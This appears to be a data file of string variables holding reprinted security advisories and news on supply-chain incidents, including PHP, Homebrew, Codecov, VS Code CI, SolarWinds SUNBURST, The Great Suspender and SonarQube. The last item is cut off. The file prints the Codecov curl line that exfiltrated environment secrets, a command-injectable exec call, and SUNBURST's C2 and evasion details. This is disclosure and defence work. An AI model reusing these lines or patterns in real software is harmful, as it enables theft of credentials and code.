article16 = "Published on None. Hi everyone, Yesterday (2021-03-28) two malicious commits were pushed to the php-src repo [1] from the names of Rasmus Lerdorf and myself. We dont yet know how exactly this happened, but everything points towards a compromise of the git.php.net server (rather than a compromise of an individual git account). While investigation is still underway, we have decided that maintaining our own git infrastructure is an unnecessary security risk, and that we will discontinue the git.php.net server. Instead, the repositories on GitHub, which were previously only mirrors, will become canonical. This means that changes should be pushed directly to GitHub rather than to git.php.net. While previously write access to repositories was handled through our home-grown karma system, you will now need to be part of the php organization on GitHub. If you are not part of the organization yet, or dont have access to a repository you should have access to, contact me at nikic@php.net with your php.net and GitHub account names, as well as the permissions youre currently missing. Membership in the organization requires 2FA to be enabled. This change also means that it is now possible to merge pull requests directly from the GitHub web interface. Were reviewing the repositories for any corruption beyond the two referenced commits. Please contact security@php.net if you notice anything. Regards, Nikita [1]: https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d and https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a"
article17 = "Published on 2021-04-21 00:00:00. On 18th April 2021, a security researcher identified a vulnerability in our review-cask-pr GitHub Action used on the homebrew-cask and all homebrew-cask-* taps (non-default repositories) in the Homebrew organization and reported it on our HackerOne.Whenever an affected cask tap received a pull request to change only the version of a cask, the review-cask-pr GitHub Action would automatically review and approve the pull request. The approval would then trigger the automerge GitHub Action which would merge the approved pull request. A proof-of-concept (PoC) pull request demonstrating the vulnerability was submitted with our permission. We subsequently reverted the PoC pull request, disabled and removed the automerge GitHub Action and disabled and removed the review-cask-pr GitHub Action from all vulnerable repositories.What was impactedThe discovered vulnerability would allow an attacker to inject arbitrary code into a cask and have it be merged automatically. This is due to a flaw in the git_diff dependency of the review-cask-pr GitHub Action, which is used to parse a pull requests diff for inspection. Due to this flaw, the parser can be spoofed into completely ignoring the offending lines, resulting in successfully approving a malicious pull request.A single cask was compromised with a harmless change for the duration of the demonstration pull request until its reversal. No action is required by users due to this incident.What were doing about itThe vulnerable review-cask-pr GitHub Action has been disabled and removed from all repositories.GitHub Action has been disabled and removed from all repositories. The automerge GitHub Action has been disabled and removed from all repositories (in favour of the GitHub built-in functionality that did not exist when this action was created).GitHub Action has been disabled and removed from all repositories (in favour of the GitHub built-in functionality that did not exist when this action was created). We have removed the ability for our bots to commit to homebrew/cask* repositories.repositories. All homebrew/cask* pull requests will require a manual review and approval by a maintainer.pull requests will require a manual review and approval by a maintainer. We are improving documentation to help onboard new homebrew/cask maintainers and training existing homebrew/core maintainers to help with homebrew/cask .We did, do and will continue to take the security of the project and our users very seriously. We try our best to behave as a for-profit company would do in terms of timely response to security issues.In order to ensure and improve Homebrews security, please consider contributing your code and code reviews to our GitHub projects.Thanks for using Homebrew!"
article18 = "Published on None. Because of our commitment to trust and transparency, we have worked diligently to determine the potential impact to our customers and identify customers who may have used the Bash Uploaders during the relevant time periods. For affected users, we have emailed you on April 15th using you email address on file from Github / Gitlab / Bitbucket, and there is a notification banner after you log in to Codecov.We strongly recommend affected users immediately re-roll all of their credentials, tokens, or keys located in the environment variables in their CI processes that used one of Codecovs Bash Uploaders.You can determine the keys and tokens that are surfaced to your CI environment by running the env command in your CI pipeline. If anything returned from that command is considered private or sensitive, we strongly recommend invalidating the credential and generating a new one. Additionally, we would recommend that you audit the use of these tokens in your system.Specifically, the bash script was altered as follows: curl -sm 0.5 -d $(git remote -v)<<<<<< ENV $(env) https:// <redacted> /upload/v2 || true Note that the IP address of the third party server has been redacted as it is currently part of an ongoing federal investigationAdditionally, if you use a locally stored version of a Bash Uploader, you should check that version for the following:curl -sm 0.5 -d $(git remote -v)If this appears anywhere in your locally stored Bash Uploader, you should immediately replace the bash files with the most recent version from https://codecov.io/bash.If you use a self-hosted (on-premises) version of Codecov, it is very unlikely you are impacted. To be impacted, your CI pipeline would need to be fetching the Bash Uploader from https://codecov.io/bash instead of from your self-hosted Codecov installation. You can verify from where you are fetching the Bash Uploader by looking at your CI pipeline configuration.If you conducted a checksum comparison before using our Bash Uploaders as part of your CI processes, this issue may not impact you."
article19 = "Published on None. This month a researcher has disclosed how he broke into the official GitHub repository of Microsoft Visual Studio Code.A vulnerability in VS Codes issue management function and a lack of authentication checks enabled the researcher to obtain push access, and write to the repository.For responsibly reporting the vulnerability, the researcher was awarded a bug bounty award of an undisclosed amount.Flawed regex, no authentication, code injection in CI scriptsWhile riding a train, researcher RyotaK discovered a vulnerability in the VS Codes Continuous Integration (CI) script that let him break into Microsoft VS Codes official GitHub repository and commit files.I was too bored while I was on the train, so I decided to read the VS Code code. After a while, I noticed that VS Code has a separate repository for CI scripts named vscode-github-triage-actions. So I decided to read it, RyotaK told BleepingComputer.Shortly, the researcher noticed an interesting line in the script that could be exploited in code injection attacks:exec(`git -C ./repo merge-base --is-ancestor ${commit} ${release}`, (err) => {Of course, there is command injection. But it requires control of the commit variable or the release variable, continued RyotaK in an email interview.The researcher soon realized the commit variable could be controlled by an attacker due to two reasons:missing authentication checks within the closedWith command (i.e. not checking if the user had the authorization to associate commit hashes with an issue), and flawed regex expression used to validate the closedWith command specified in a closing comment.The closedWith command is used to associate a commit hash with the issue before the commit is closed.However, a flawed regex expression (shown below) used to validate the closing comments and no authentication checks in the CI script meant, any user could associate a commit with an issue, and inject code within the closedWith value.const closingHashComment = /(?:\\|\/)closedWith (\S*)/Because VS Codes vulnerable CI workflow ran once a day, around midnight, the researcher carefully planned a Proof-of-Concept (PoC) exploit in advance, so as to not make any dangerous mistakes during night hours.To do so, the researcher browsed through the GitHub Actions code files for the project to get an understanding of the Continuous Integration and Continuous Delivery (CI/CD) workflow.Fortunately, the workflow files for GitHub Actions are published on GitHub, so I have some idea of whats going on inside GitHub Actions.Since actions/checkout was executed in the step before the vulnerable workflow file is used, there was a GitHub token with write permission to the repository. So I made a plan to use this token, the researcher told BleepingComputer.By injecting his basic PoC exploit into the VS Codes CI script which ran around midnight, the researcher obtained a reverse shell.Further, the researcher obtained the GitHub authorization token for VS Code repository that would give him write access to the repository.Eventually, after obtaining the token, the researcher posted a PoC commit to the repository:RyotaK successfully committed to Microsoft VS Codes GitHub repo by exploiting the flawsAlthough, the master branch of the repository had account-based branch protections that could not be bypassed with the GitHub Actions token, it was possible to push the file to the release branch using the token, states the researcher.It is worth noting RyotaK performed this PoC exploit while adhering to Microsofts safe harbor guidelines when reporting vulnerabilities through their bug bounty programs.Microsoft permits the diagnosis of vulnerabilities through safe harbors. This article describes the vulnerabilities discovered / reported in compliance with the safe harbor, and is not intended to recommend unauthorized vulnerability diagnosis, stated RyotaK in his blog post.For his discovery of the vulnerability and following responsible disclosure guidelines, the researcher told BleepingComputer, that he was awarded a cash bounty prize of an undisclosed amount by Microsoft.Code repo flaws may pave ways for software supply chain attacksFlaws of this extent that enable adversaries to break into otherwise secure software codebases can lay the groundwork for sophisticated software supply chain attacks.This astounding discovery comes to light when the SolarWinds supply chain attack incident has already been making headlines.In this case, the ethical hacker RyotaK discovered and responsibly reported the flaw to Microsoft before advanced threat actors could exploit it, to push their malicious code upstream into the Visual Studio Code repository.Corruption of source-code editors and IDEs in a targeted supply chain attack can have devastating consequences for its users, developers, and the clients that would then be receiving the applications built using a tainted IDE.Recently, another group of security researchers reported finding exposed Git credentials due to improperly secured .git directories on UN domains.This discovery enabled them to clone the entire Git repository of the United Nations Environment Programme (UNEP) and eventually access over 100,000 employee records.Securing your CI/CD tools, and proactively auditing their scripts for security flaws before adversaries exploit any vulnerabilities are a few defenses towards preventing software supply-chain compromises."
article20 = r"Published on None. UPDATE (May 2022): We have merged UNC2452 with APT29. The UNC2452 activity described in this post is now attributed to APT29.Executive SummaryWe have discovered a global intrusion campaign. We are tracking the actors behind this campaign as UNC2452.FireEye discovered a supply chain attack trojanizing SolarWinds Orion business software updates in order to distribute malware we call SUNBURST.The attackers post compromise activity leverages multiple techniques to evade detection and obscure their activity, but these efforts also offer some opportunities for detection.The campaign is widespread, affecting public and private organizations around the world.FireEye is releasing signatures to detect this threat actor and supply chain attack in the wild. These are found on our public GitHub page. FireEye products and services can help customers detect and block this attack.SummaryFireEye has uncovered a widespread campaign, that we are tracking as UNC2452. The actors behind this campaign gained access to numerous public and private organizations around the world. They gained access to victims via trojanized updates to SolarWinds Orion IT monitoring and management software. This campaign may have begun as early as Spring 2020 and is currently ongoing. Post compromise activity following this supply chain compromise has included lateral movement and data theft. The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security.SUNBURST BackdoorSolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers. We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.After an initial dormant period of up to two weeks, it retrieves and executes commands, called Jobs, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services. The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity. The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers.Figure 1: SolarWinds digital signature on software with backdoorMultiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including:hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.mspThe trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component. Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration). After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will return a CNAME record that points to a Command and Control (C2) domain. The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications. The list of known malicious infrastructure is available on FireEyes GitHub page.Worldwide Victims Across Multiple VerticalsFireEye has detected this activity at multiple entities worldwide. The victims have included government, consulting, technology, telecom and extractive entities in North America, Europe, Asia and the Middle East. We anticipate there are additional victims in other countries and verticals. FireEye has notified all entities we are aware of being affected.Post Compromise Activity and Detection OpportunitiesWe are currently tracking the software supply chain compromise and related post intrusion activity as UNC2452. After gaining initial access, this group uses a variety of techniques to disguise their operations while they move laterally (Figure 2). This actor prefers to maintain a light malware footprint, instead preferring legitimate credentials and remote access for access into a victims environment.Figure 2: Post-compromise tacticsThis section will detail the notable techniques and outline potential opportunities for detection.TEARDROP and BEACON Malware UsedMultiple SUNBURST samples have been recovered, delivering different payloads. In at least one instance the attackers deployed a previously unseen memory-only dropper weve dubbed TEARDROP to deploy Cobalt Strike BEACON.TEARDROP is a memory only dropper that runs as a service, spawns a thread and reads from the file gracious_truth.jpg, which likely has a fake JPG header. Next it checks that HKU\SOFTWARE\Microsoft\CTF exists, decodes an embedded payload using a custom rolling XOR algorithm and manually loads into memory an embedded payload using a custom PE-like file format. TEARDROP does not have code overlap with any previously seen malware. We believe that this was used to execute a customized Cobalt Strike BEACON.Mitigation: FireEye has provided two Yara rules to detect TEARDROP available on our GitHub. Defenders should look for the following alerts from FireEye HX: MalwareGuard and WindowsDefender:Process Informationfile_operation_closedfile-path*: c:\\windows\\syswow64\etsetupsvc.dllactor-process:pid: 17900Windows defender Exploit Guard log entries: (Microsoft-Windows-Security-Mitigations/KernelMode event ID 12)Process\Device\HarddiskVolume2\Windows\System32\svchost.exe (PID XXXXX) would have been blocked from loading the non-Microsoft-signed binary\Windows\SysWOW64\NetSetupSvc.dllAttacker Hostnames Match Victim EnvironmentThe actor sets the hostnames on their command and control infrastructure to match a legitimate hostname found within the victims environment. This allows the adversary to blend into the environment, avoid suspicion, and evade detection.Detection OpportunityThe attacker infrastructure leaks its configured hostname in RDP SSL certificates, which is identifiable in internet-wide scan data. This presents a detection opportunity for defenders -- querying internet-wide scan data sources for an organizations hostnames can uncover malicious IP addresses that may be masquerading as the organization. (Note: IP Scan history often shows IPs switching between default (WIN-*) hostnames and victims hostnames) Cross-referencing the list of IPs identified in internet scan data with remote access logs may identify evidence of this actor in an environment. There is likely to be a single account per IP address.IP Addresses located in Victims CountryThe attackers choice of IP addresses was also optimized to evade detection. The attacker primarily used only IP addresses originating from the same country as the victim, leveraging Virtual Private Servers.Detection OpportunityThis also presents some detection opportunities, as geolocating IP addresses used for remote access may show an impossible rate of travel if a compromised account is being used by the legitimate user and the attacker from disparate IP addresses. The attacker used multiple IP addresses per VPS provider, so once a malicious login from an unusual ASN is identified, looking at all logins from that ASN can help detect additional malicious activity. This can be done alongside baselining and normalization of ASNs used for legitimate remote access to help identify suspicious activity.Lateral Movement Using Different CredentialsOnce the attacker gained access to the network with compromised credentials, they moved laterally using multiple different credentials. The credentials used for lateral movement were always different from those used for remote access.Detection OpportunityOrganizations can use HXs LogonTracker module to graph all logon activity and analyze systems displaying a one-to-many relationship between source systems and accounts. This will uncover any single system authenticating to multiple systems with multiple accounts, a relatively uncommon occurrence during normal business operations.Temporary File Replacement and Temporary Task ModificationThe attacker used a temporary file replacement technique to remotely execute utilities: they replaced a legitimate utility with theirs, executed their payload, and then restored the legitimate original file. They similarly manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returning the scheduled task to its original configuration. They routinely removed their tools, including removing backdoors once legitimate remote access was achieved.Detection OpportunityDefenders can examine logs for SMB sessions that show access to legitimate directories and follow a delete-create-execute-delete-create pattern in a short amount of time. Additionally, defenders can monitor existing scheduled tasks for temporary updates, using frequency analysis to identify anomalous modification of tasks. Tasks can also be monitored to watch for legitimate Windows tasks executing new or unknown binaries.This campaigns post compromise activity was conducted with a high regard for operational security, in many cases leveraging dedicated infrastructure per intrusion. This is some of the best operational security that FireEye has observed in a cyber attack, focusing on evasion and leveraging inherent trust. However, it can be detected through persistent defense.In-Depth Malware AnalysisSolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers. After an initial dormant period of up to two weeks, it retrieves and executes commands, called Jobs, that include the ability to transfer and execute files, profile the system, and disable system services. The backdoors behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files. The backdoor uses multiple blocklists to identify forensic and anti-virus tools via processes, services, and drivers.Unique CapabilitiesSubdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victimsCommand and control traffic masquerades as the legitimate Orion Improvement ProgramCode hides in plain site by using fake variable names and tying into legitimate componentsDelivery and InstallationAuthorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWindss website. The update package CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp (02af7cec58b9a5da1c542b5a32151ba1) contains the SolarWinds.Orion.Core.BusinessLayer.dll described in this report. After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll. This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework. Hidden in plain sight, the class SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer implements an HTTP-based backdoor. Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded.SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed. The file was signed on March 24, 2020.InitializationOn execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941. This hash value is calculated as the standard FNV-1A 64-bit hash with an additional XOR by 6605813339339102567 after computing the FNV-1A. This hash matches a process named solarwinds.businesslayerhost.The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval. The sample continues to check this time threshold as it is run by a legitimate recurring background task. Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings. The appSettings fields keys are legitimate values that the malicious logic re-purposes as a persistent configuration. The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution.The sample checks that the machine is domain joined and retrieves the domain name before execution continues. A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid. The userID is encoded via a custom XOR scheme after the MD5 is calculated. The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value. This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags. The sample then invokes the method Update which is the core event loop of the sample.DGA and BlocklistsThe backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com. The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains. Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name. The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware. These subdomains are concatenated with one of the following to create the hostname to resolve:.appsync-api.eu-west-1[.]avsvmcloud[.]com.appsync-api.us-west-2[.]avsvmcloud[.]com.appsync-api.us-east-1[.]avsvmcloud[.]com.appsync-api.us-east-2[.]avsvmcloud[.]comProcess name, service name, and driver path listings are obtained, and each value is hashed via the FNV-1a + XOR algorithm as described previously and checked against hardcoded blocklists. Some of these hashes have been brute force reversed as part of this analysis, showing that these routines are scanning for analysis tools and antivirus engine components. If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes. Blocklisted services are stopped by setting their HKLM\SYSTEM\CurrentControlSet\services\<service_name>\Start registry entries to value 4 for disabled. Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated. The list of stopped services is then bit-packed into the ReportWatcherPostpone key of the appSettings entry for the samples config file. If any service was transitioned to disabled the Update method exits and retries later. The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver. If any blocklisted driver is seen the Update method exits and retries. If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity.Network Command and Control (C2)If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA. The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours). The DNS A record of generated domains is checked against a hardcoded list of IP address blocks which control the malwares behavior. Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution:10.0.0.0/8172.16.0.0/12192.168.0.0/16224.0.0.0/3fc00:: - fe00::fec0:: - ffc0::ff00:: - ff00::20.140.0.0/1596.31.172.0/24131.228.12.0/22144.86.226.0/24Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching. The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command. The HTTP thread will delay for a minimum of 1 minute between callouts. The malware uses HTTP GET or HTTP POST requests. If the sample is attempting to send outbound data the content-type HTTP header will be set to application/octet-stream otherwise to application/json.A JSON payload is present for all HTTP POST and PUT requests and contains the keys userId, sessionId, and steps. The steps field contains a list of objects with the following keys: Timestamp, Index, EventType, EventName, DurationMs, Succeeded, and Message. The JSON key EventType is hardcoded to the value Orion, and the EventName is hardcoded to EventManager. Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the Message fields in the steps array. Each Message value is Base64 encoded separately. Not all objects in the steps array contribute to the malware message the integer in the Timestamp field must have the 0x2 bit set to indicate that the contents of the Message field are used in the malware message. Step objects whose bit 0x2 is clear in the Timestamp field contain random data and are discarded when assembling the malware response.SteganographyIn observed traffic these HTTP response bodies attempt to appear like benign XML related to .NET assemblies, but command data is actually spread across the many GUID and HEX strings present. Commands are extracted from HTTP response bodies by searching for HEX strings using the following regular expression:. Command data is spread across multiple strings that are disguised as GUID and HEX strings. All matched substrings in the response are filtered for non HEX characters, joined together, and HEX-decoded. The first DWORD value shows the actual size of the message, followed immediately with the message, with optional additional junk bytes following. The extracted message is single-byte XOR decoded using the first byte of the message, and this is then DEFLATE decompressed. The first character is an ASCII integer that maps to the JobEngine enum, with optional additional command arguments delimited by space characters.Commands are then dispatched to a JobExecutionEngine based upon the command value as described next.Supported CommandsCommand Value Operation Idle 0 No operation Exit 1 Terminate the current thread. SetTime 2 Sets the delay time between main event loop executions Delay is in seconds, and varies random between [.9 * <delay>, 1.1 * <delay>]. If the delay is < 300 it is doubled on the next execution through the loop, this means it should settle onto an interval of around [5, 10] minutes. There is a second, unrelated delay routine that delays for a random interval between [16hrs, 83hrs] CollectSystemDescription 3 Profile the local system including hostname, username, OS version, MAC addresses, IP address, DHCP configuration, and domain information. UploadSystemDescription 4 Perform a HTTP request to the specified URL, parse the results and compare components against unknown hashed values. Format a report and send to the C2 server. RunTask 5 Starts a new process with the given file path and arguments GetProcessByDescription 6 Returns a process listing. If no arguments are provided returns just the PID and process name. If an argument is provided it also returns the parent PID and username and domain for the process owner. KillTask 7 Terminate the given process, by PID. GetFileSystemEntries 8 Given a path and an optional match pattern recursively list files and directories WriteFile 9 Given a file path and a Base64 encoded string write the contents of the Base64 decoded string to the given file path. Write using append mode. Delay for [1s, 2s] after writing is done. FileExists 10 Tests whether the given file path exists. DeleteFile 11 Deletes the specified file path. GetFileHash 12 Compute the MD5 of a file at a given path and return result as a HEX string. If an argument is provided, it is the expected MD5 hash of the file and returns an error if the calculated MD5 differs. ReadRegistryValue 13 Arbitrary registry read from one of the supported hives SetRegistryValue 14 Arbitrary registry write from one of the supported hives. DeleteRegistryValue 15 Arbitrary registry delete from one of the supported hives GetRegistrySubKeyAndValueNames 16 Returns listing of subkeys and value names beneath the given registry path Reboot 17 Attempts to immediately trigger a system reboot.Indicators and Detections to Help the CommunityTo empower the community to detect this supply chain backdoor, we are publishing indicators and detections to help organizations identify this backdoor and this threat actor. The signatures are a mix of Yara, IOC, and Snort formats.A list of the detections and signatures are available on the FireEye GitHub repository found here. We are releasing detections and will continue to update the public repository with overlapping detections for host and network-based indicators as we develop new or refine existing ones. We have found multiple hashes with this backdoor and we will post updates of those hashes.MITRE ATT&CK Techniques ObservedID Description T1012 Query Registry T1027 Obfuscated Files or Information T1057 Process Discovery T1070.004 File Deletion T1071.001 Web Protocols T1071.004 Application Layer Protocol: DNS T1083 File and Directory Discovery T1105 Ingress Tool Transfer T1132.001 Standard Encoding T1195.002 Compromise Software Supply Chain T1518 Software Discovery T1518.001 Security Software Discovery T1543.003 Windows Service T1553.002 Code Signing T1568.002 Domain Generation Algorithms T1569.002 Service Execution T1584 Compromise InfrastructureImmediate Mitigation RecommendationsPrior to following SolarWinds recommendation to utilize Orion Platform release 2020.2.1 HF 1, which is currently available via the SolarWinds Customer Portal, organizations should consider preserving impacted devices and building new systems using the latest versions. Applying an upgrade to an impacted box could potentially overwrite forensic evidence as well as leave any additional backdoors on the system. In addition, SolarWinds has released additional mitigation and hardening instructions here.In the event you are unable to follow SolarWinds recommendations, the following are immediate mitigation techniques that could be deployed as first steps to address the risk of trojanized SolarWinds software in an environment. If attacker activity is discovered in an environment, we recommend conducting a comprehensive investigation and designing and executing a remediation strategy driven by the investigative findings and details of the impacted environment.Ensure that SolarWinds servers are isolated / contained until a further review and investigation is conducted. This should include blocking all Internet egress from SolarWinds servers.If SolarWinds infrastructure is not isolated, consider taking the following steps: Restrict scope of connectivity to endpoints from SolarWinds servers, especially those that would be considered Tier 0 / crown jewel assets Restrict the scope of accounts that have local administrator privileged on SolarWinds servers. Block Internet egress from servers or other endpoints with SolarWinds software.Consider (at a minimum) changing passwords for accounts that have access to SolarWinds servers / infrastructure. Based upon further review / investigation, additional remediation measures may be required.If SolarWinds is used to managed networking infrastructure, consider conducting a review of network device configurations for unexpected / unauthorized modifications. Note, this is a proactive measure due to the scope of SolarWinds functionality, not based on investigative findings.AcknowledgementsThis blog post was the combined effort of numerous personnel and teams across FireEye coming together. Special thanks to:Andrew Archer, Doug Bienstock, Chris DiGiamo, Glenn Edwards, Nick Hornick, Alex Pennino, Andrew Rector, Scott Runnels, Eric Scales, Nalani Fraser, Sarah Jones, John Hultquist, Ben Read, Jon Leathery, Fred House, Dileep Jallepalli, Michael Sikorski, Stephen Eckels, William Ballenthin, Jay Smith, Alex Berry, Nick Richard, Isif Ibrahima, Dan Perez, Marcin Siedlarz, Ben Withnell, Barry Vengerik, Nicole Oppenheim, Ian Ahl, Andrew Thompson, Matt Dunwoody, Evan Reese, Steve Miller, Alyssa Rahman, John Gorman, Lennard Galang, Steve Stone, Nick Bennett, Matthew McWhirt, Mike Burns, Omer Baig.Also special thanks to Nick Carr, Christopher Glyer, and Ramin Nafisi from Microsoft."
article21 = "Published on 2021-02-04 20:15:00.664000+00:00. Ive been a fan of The Great Suspender extension for years. Even when Google would drop new features into its Chrome browser to reduce the resources inactivate browser tabs eat up, I still trusted The Great Suspender to inactivate them for me to lessen the load on my system. But The Great Suspender is not to be trusted any longer —so much so, that Google removed it from the Chrome W eb S tore in F ebruary 2021 for being malware.Before we get to the alternatives you can use instead of this once-helpful extension, Dr. Colin McMillen, lead developer at SemiColin Games , shed some light on extensions new nefarious parts a month before its removal :Heres the longer story: The Great Suspender got a new maintainer (formerly Dean Oemcke), and this unknown entity dropped a few silent updates to new builds of the extension allowing it to connect to various third-party servers and execute code. The extension suddenly started asking for new permissions as well, like an all-encompassing ability to mess with your browsers web requests. As Githubs TheMageKing wrote in November of last year:That lets the extension do what it pleases, including inserting ads, blocking sites, forcible redirects.... This change was supposedly in order to enable new screenshot functionality, but that was unclear.They continued:On November 6th, @lucasdf discovered a smoking gun that the new maintainer is malicious. Although OpenWebAnalytics is a real software, it does not provide the files executed by the extension. Those are hosted on the unrelated site owebanalytics.com, which turns out to be immensely suspicious. That site is one month old, and is clearly designed to appear innocent, being hosted on a public webhost, and being given a seemingly innocent homepage from the CentOS project. However, the site contains no real information other than the tracking scripts, and is only found in the context of this extension. Most importantly, the minified javascript differs significantly from that distributed by the OWA project. While there does exist an innocent explanation for this, I can no longer say that it is the most likely. Using the chrome web store version of this extension, without disabling tracking, will execute code from an untrusted third-party on your computer, with the power to modify any and all websites that you see. The fact that disabling tracking still works is irrelevant given the fact that most of the 2 million users of this extension have no idea that that option even exists. The fact that the code is not obvious malware is meaningless in light of the fact that it can be changed without notice, and that it is minified (human-unreadable).The mysterious way the whole situation was handled by the extensions new maintainer—and their complete silence on this matter (and everything else recently)—made me a bit nervous that a similar situation could happen again, so I switched away from the add-on in all my browsers. I recommend you do the same, even if it is available on other extension stores, and try these alternativesBetter choices than The Great Suspender for your browserFirst, before you try out any alternatives , make sure you use The Great Suspender to unsuspe nd all of your open tabs before you remove the extension from your browser. And once youve done that, its as good a time as any to go through those tabs and convert as many into bookmarks as you can. An organized browser is a happy browser.After you uninstall The Great Suspender, dont search the Chrome Web Store for alternatives. It seems like plenty of people are launching their own variants nowadays, but how trustworthy are they? Id stick to some alternatives that people have already been using —and presumably, vetting.I recommended checking out this fork of The Great Suspender that removes any and all of its tracking. Its unclear if this variant will be maintained going forward, given The Great Suspenders removal from the Chrome W eb S tore, but it should work for quite some time.But do you need The Great Suspender at all? As I mentioned, your modern-day browser already probably does a decent job of resource management for inactive tabs. If youre on Chrome, for example, Tab Freeze is already built into your browser by default. After five minutes, the browser frees up the memory used by tabs you have open, but arent using.If you need more help than that, you have other options for reducing your open tabs and freeing up your precious system resources. Im a big fan of OneTab and Tabs Outliner, which dump all of your open tabs into a single, easy-to-navigate screen (or sidebar). There are other extensions that limit the number of tabs you can open, a great way to preserve resources and restrain your sprawl. And if you only want a replacement for The Great Suspender, there are other extensions that perform similarly.Whatever your choice, its time to officially say goodbye to The Great Suspender. It served us well for years, but no king rules forever.Close All Your Tabs. Just Close Em Lifehacker has spilled a lot of digital ink over the years trying to help you get your browser tabs Read moreUpdate 2/4/21: We updated this ar ticle to reflect the latest news about The Great Suspenders removal from the Chrome W eb S tore."
article22 = "Published on None. The Federal Bureau of Investigation has sent out a security alert warning that threat actors are abusing misconfigured SonarQube applications to access and steal source code repositories from US government agencies and private businesses.Intrusions have taken place since at least April 2020, the FBI said in an alert sent out last month and made public this week on its website.The alert specifically warns owners of SonarQube, a web-based application that companies integrate into their software build chains to test source code and discover security flaws before rolling out code and applications into production environments.SonarQube apps are installed on web servers and connected to source code hosting systems like BitBucket, GitHub, or GitLab accounts, or Azure DevOps systems.But the FBI says that some companies have left these systems unprotected, running on their default configuration (on port 9000) with default admin credentials (admin/admin).FBI officials say that threat actors have abused these misconfigurations to access SonarQube instances, pivot to the connected source code repositories, and then access and steal proprietary or private/sensitive applications.Officials provided two examples of past incidents:In August 2020, unknown threat actors leaked internal data from two organizations through a public lifecycle repository tool. The stolen data was sourced from SonarQube instances that used default port settings and admin credentials running on the affected organizations networks.This activity is similar toa previous data leak in July 2020, in which an identified cyber actor exfiltrated proprietary source code from enterprises throughpoorly secured SonarQube instances and published the exfiltrated source codeon a self-hosted public repository.Forgot problem resurfaces in 2020The FBI alert touches on a little known issue among software developers and security researchers.While the cyber-security industry has often warned about the dangers of leaving MongoDB or Elasticsearch databases exposed online without passwords, SonarQube has slipped through the cracks.However, some security researchers have been warning about the dangers of leaving SonarQube applications exposed online with default credentials since as far back as May 2018.At the time, data breach hunter Bob Diachenko warned that about 30% to 40% of all the ~3,000 SonarQube 